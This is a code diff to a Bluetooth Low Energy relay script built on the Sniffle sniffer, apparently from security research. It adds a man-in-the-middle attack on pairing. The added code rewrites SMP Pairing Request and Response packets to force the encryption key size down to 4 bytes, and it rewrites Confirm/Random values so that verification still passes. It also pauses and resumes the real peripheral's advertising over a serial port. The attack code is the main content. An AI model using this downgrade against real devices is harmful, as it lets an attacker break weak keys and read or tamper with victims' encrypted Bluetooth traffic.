@@ -6,6 +6,7 @@
 # Released as open source under GPLv3
 
 import argparse, sys, signal
+import serial
 from binascii import unhexlify
 from queue import Queue
 from time import time
@@ -19,6 +20,8 @@ from sniffle.packet_decoder import DPacketMessage, DataMessage, LlDataContMessag
         AdvIndMessage, AdvDirectIndMessage, ScanRspMessage, ConnectIndMessage, \
         str_mac, LlControlMessage, AdvertMessage
 from sniffle.relay_protocol import RelayServer, MessageType, ErrorCode
+
+from mitble_help import downgrade_pairing_request, downgrade_pairing_response, LegacyMitm
 
 """
 Relay attack principles:
@@ -76,6 +79,8 @@ hw = None
 # global variable for pcap writer
 pcwriter = None
 
+mitm = None
+
 def sigint_handler(sig, frame):
     hw.cancel_recv()
     hw.cmd_chan_aa_phy() # stop scanning or connection
@@ -104,10 +109,16 @@ def main():
     aparse.add_argument("-F", "--fastmaster", action="store_const", default=False, const=True,
             help="Relay master should specify a fast connection interval")
     aparse.add_argument("-o", "--output", default=None, help="PCAP output file name")
+    aparse.add_argument("--periph-serial", default=None,
+        help="Serial port of the REAL peripheral (e.g. COM7 or /dev/ttyACM0)")
+    aparse.add_argument("--periph-baud", type=int, default=115200,
+        help="Baudrate for the REAL peripheral (default: 115200)")
     args = aparse.parse_args()
-
-    global hw
+    global hw, mitm
     hw = SniffleHW(args.serport)
+    new_key_size = 0x04
+    mitm = LegacyMitm(key_size=new_key_size)
+
 
     # put the hardware in a normal state (passive scanning) and configure it with an impossibly
     # high RSSI threshold so that it captures nothing (to avoid filling receive buffers)
@@ -179,7 +190,14 @@ def main():
     # buffer while waiting for connection from relay slave
     hw.setup_sniffer(mode=SnifferMode.PASSIVE_SCAN, rssi_min=0)
 
-    # Pause until key press if option selected
+    if args.periph_serial:
+        try:
+            with serial.Serial(args.periph_serial, args.periph_baud, timeout=0.5) as ser:
+                ser.write(b'0')
+            print(f"[UART->PERIPH] Sent '0' to {args.periph_serial} (pause advertising).")
+        except Exception as e:
+            print(f"[UART->PERIPH] WARNING: could not send '0' on {args.periph_serial}: {e}", file=sys.stderr)
+
     if args.pause:
         input("Press enter to continue...")
     conn.send_msg(MessageType.PING, b'')
@@ -194,8 +212,25 @@ def main():
     conn_req = DPacketMessage.from_body(body)
     if not isinstance(conn_req, ConnectIndMessage):
         raise ValueError("CONN_REQ was not a CONN_REQ!")
+
+    if args.periph_serial:
+        try:
+            with serial.Serial(args.periph_serial, args.periph_baud, timeout=0.5) as ser:
+                ser.write(b'1')
+            print(f"[UART->PERIPH] Sent '1' to {args.periph_serial} (resume advertising).")
+        except Exception as e:
+            print(f"[UART->PERIPH] WARNING: could not send '1' on {args.periph_serial}: {e}", file=sys.stderr)
+
     print("Relay slave notified us of connection request. Connecting to real target...")
     print(conn_req)
+
+    connector_addr = conn_req.InitA
+    connector_random = bool(conn_req.TxAdd)
+    # ... you already have targ stuff from earlier scan/args:
+    advA = mac_bytes
+    advA_is_random = not args.public
+    mitm.set_addresses(initA=connector_addr, initA_is_random=connector_random,
+                    advA=bytes(advA), advA_is_random=advA_is_random)
 
     global pcwriter
     if not (args.output is None):
@@ -238,6 +273,7 @@ def main():
         msg = hw.recv_and_decode()
         print(msg)
         if isinstance(msg, StateMessage) and msg.new_state == SnifferState.CENTRAL:
+            print("Inside if")
             hw.decoder_state.cur_aa = conn_req.aa_conn
             break
     print("Connected to target.", end='\n\n')
@@ -261,9 +297,9 @@ def main():
         ready, _, _ = select([hw.ser.fd, conn.sock], [], [])
 
         if conn.sock in ready:
-            sock_recv_print_forward(conn, args.quiet, filter_changes)
+            sock_recv_print_forward(conn, args.quiet, new_key_size, filter_changes)
         if hw.ser.fd in ready:
-            ser_recv_print_forward(conn, args.quiet, filter_changes)
+            ser_recv_print_forward(conn, args.quiet,new_key_size, filter_changes)
 
 def has_instant(pkt):
     return isinstance(pkt, LlControlMessage) and pkt.opcode in [0x00, 0x01, 0x18]
@@ -271,11 +307,73 @@ def has_instant(pkt):
 def is_param_req(pkt):
     return isinstance(pkt, LlControlMessage) and pkt.opcode == 0x0F
 
-def sock_recv_print_forward(conn, quiet, filter_changes=False):
+def _hex_bytes(b: bytes) -> str:
+    return " ".join(f"{x:02x}" for x in b)
+
+def _extract_smp_key_size_from_ll_body(ll_body: bytes):
+    """
+    Returns (smp_code, key_size) if this LL body contains an SMP Pairing Req/Rsp,
+    else returns (None, None). Safe to call on any LL body.
+    """
+    if len(ll_body) < 4:
+        return (None, None)
+    llid = ll_body[0] & 0x03
+    length = ll_body[1]
+    if llid != 0x02 or len(ll_body) < 2 + length or length < 4:
+        return (None, None)
+    l2cap = ll_body[2:2+length]
+    if len(l2cap) < 7:
+        return (None, None)
+    l2len = l2cap[0] | (l2cap[1] << 8)
+    cid   = l2cap[2] | (l2cap[3] << 8)
+    if cid != 0x0006 or len(l2cap) < 4 + l2len or l2len < 7:
+        return (None, None)
+    smp = l2cap[4:4+l2len]
+    smp_code = smp[0]
+    if smp_code not in (0x01, 0x02):  # Pairing Request / Response
+        return (None, None)
+    return (smp_code, smp[4])
+
+
+def sock_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
     # receive packets from relay slave and retransmit them here
     mtype, body = conn.recv_msg()
     if mtype != MessageType.PACKET:
         return
+
+    # Keep a copy of the original [event_le16][LL body ...]
+    old_packet = body
+
+    # Downgrade entropy if this is an SMP Pairing Response coming from the relay slave
+    new_packet, changed = downgrade_pairing_response(body, new_key_size)
+    body = new_packet
+
+    if changed:
+        # Compare LL bodies (skip the 2-byte event header)
+        old_ll = old_packet[2:]
+        new_ll = new_packet[2:]
+
+        old_code, old_ks = _extract_smp_key_size_from_ll_body(old_ll)
+        new_code, new_ks = _extract_smp_key_size_from_ll_body(new_ll)
+        code_name = {0x01: "Pairing Request", 0x02: "Pairing Response"}.get(old_code, "SMP")
+
+        # Guard against any unexpected None values (shouldn't happen if changed=True)
+        if old_ks is None or new_ks is None:
+            print("[DOWNGRADE] SMP key size changed (peripheral -> master).")
+        else:
+            print(f"[DOWNGRADE] {code_name} (from peripheral): key size {old_ks} -> {new_ks}")
+
+        print(f"  old LL body ({len(old_ll)} bytes): {_hex_bytes(old_ll)}")
+        print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")
+
+    # Now also rewrite SMP Confirm/Random to keep verification happy (central->periph direction)
+    ll_before = body[2:]  # skip event_le16
+    ll_after, ch2 = mitm.rewrite_ll_body(ll_before, direction="to_periph")
+    if ch2:
+        print(f"[MITM] to_periph: LL before ({len(ll_before)} bytes): {_hex_bytes(ll_before)}")
+        print(f"[MITM] to_periph: LL after  ({len(ll_after)} bytes):  {_hex_bytes(ll_after)}")
+        body = body[:2] + ll_after
+    # Unpack event and proceed as before
     event, = unpack('<H', body[:2])
     body = body[2:]
     llid = body[0] & 3
@@ -293,7 +391,8 @@ def sock_recv_print_forward(conn, quiet, filter_changes=False):
         hw.cmd_transmit(llid, pdu, event)
     print_message(pkt, quiet)
 
-def ser_recv_print_forward(conn, quiet, filter_changes=False):
+
+def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
     msg = hw.recv_and_decode()
 
     if isinstance(msg, PacketMessage):
@@ -301,6 +400,28 @@ def ser_recv_print_forward(conn, quiet, filter_changes=False):
         # only forward non-empty data
         empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0
         block_req = filter_changes and is_param_req(msg)
+
+        # Try to downgrade entropy on outgoing DataMessage LL bodies
+        if not empty and not block_req and isinstance(msg, DataMessage):
+            old_body = msg.body
+            new_ll, changed = downgrade_pairing_request(old_body, new_key_size)
+            if changed:
+                # Best-effort: print SMP code and key sizes before/after
+                old_code, old_ks = _extract_smp_key_size_from_ll_body(old_body)
+                new_code, new_ks = _extract_smp_key_size_from_ll_body(new_ll)
+                # Human-friendly name
+                code_name = {0x01: "Pairing Request", 0x02: "Pairing Response"}.get(old_code, "SMP")
+                print(f"[DOWNGRADE] {code_name}: key size {old_ks} -> {new_ks}")
+                print(f"  old LL body ({len(old_body)} bytes): {_hex_bytes(old_body)}")
+                print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")
+                msg.body = new_ll
+                # Also rewrite SMP Confirm/Random in periph->central direction
+        if not empty and not block_req and isinstance(msg, DataMessage):
+            ll_before = msg.body
+            ll_after, ch3 = mitm.rewrite_ll_body(ll_before, direction="to_central")
+            if ch3:
+                msg.body = ll_after
+
         if not empty and not block_req:
             # Forward packets to the relay slave
             conn.send_msg(MessageType.PACKET, pack('<H', msg.event) + msg.body)
